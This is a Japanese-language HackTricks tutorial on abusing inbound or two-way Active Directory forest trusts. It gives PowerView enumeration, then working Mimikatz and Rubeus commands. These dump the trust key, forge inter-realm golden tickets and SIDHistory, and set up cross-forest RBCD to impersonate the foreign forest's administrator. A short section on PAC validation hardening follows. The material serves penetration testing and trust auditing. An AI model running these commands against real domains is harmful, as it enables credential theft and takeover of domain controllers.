# 外部フォレストドメイン - OneWay (Inbound) または双方向

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、外部ドメインがあなたを信頼している（または相互に信頼している）ため、そのドメインに対して何らかのアクセス権を取得できます。

## 列挙

まず、**trust** を**列挙**する必要があります。
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` により、追加の前提条件なしで、cross-forest abuse path（RBCD、SIDHistory）が機能する可能性をすぐに確認できます。<sup>[[2]](#references)</sup>

前回の enumeration で、ユーザー **`crossuser`** が、**External Domain の DC** 内で **Admin access** を持つ **`External Admins`** グループに所属していることが判明しました。

## 初期アクセス

他のドメインで自分のユーザーに **special** access が見つからなかった場合でも、AD Methodology に戻り、**unprivileged user から privesc** を試すことができます（例えば kerberoasting など）。

`-Domain` param を使用して、次のように **Powerview functions** で **other domain** を **enumerate** できます：
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### ログイン

外部ドメインへのアクセス権を持つユーザーの認証情報を使用して通常の方法でログインすれば、次のことが可能なはずです：
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

forest trust across でも [**SID History**](sid-history-injection.md) を abuse できます。

ユーザーが **ある forest から別の forest へ** migration され、**SID Filtering が有効化されていない**場合、**もう一方の forest の SID** を **追加**できるようになり、この **SID** は **trust をまたいで authentication** する際に **ユーザーの token** に **追加**されます。

> [!WARNING]
> 念のため、signing key は次のコマンドで取得できます。
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

**trusted** key で **sign** し、現在の domain のユーザーになりすました **TGT** を作成できます。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### ユーザーを完全に偽装する方法
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD: trusting forest の machine account を制御している場合（SID filtering / selective auth なし）

foreign principal（FSP）によって、trusting forest 内の computer object に書き込み可能な group（例: `Account Operators`、custom provisioning group）に所属できる場合、その forest の target host に **Resource-Based Constrained Delegation** を設定し、そこで任意の user を impersonate できます:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
これは **SelectiveAuthentication が無効**で、かつ **SID filtering** によって制御対象の SID が削除されない場合にのみ機能します。SIDHistory forging を回避できる高速な lateral path であり、trust review で見落とされることがよくあります。<sup>[[2]](#references)</sup>

### PAC validation の hardening

**CVE-2024-26248**/**CVE-2024-29056** に対する PAC signature validation の更新により、inter-forest ticket に対する signing enforcement が追加されます。**Compatibility mode** では、forged inter-realm PAC/SIDHistory/S4U path が、未 patch の DC 上で引き続き機能する可能性があります。**Enforcement mode** では、forest trust を越える unsigned または改ざんされた PAC data は、対象 forest の trust key も保持していない限り拒否されます。Registry override（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）が利用可能な間は、これによって保護を弱めることができます。<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – CVE-2024-26248 および CVE-2024-29056 に関する PAC validation の変更](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC spec – SID filtering および claims transformation の詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
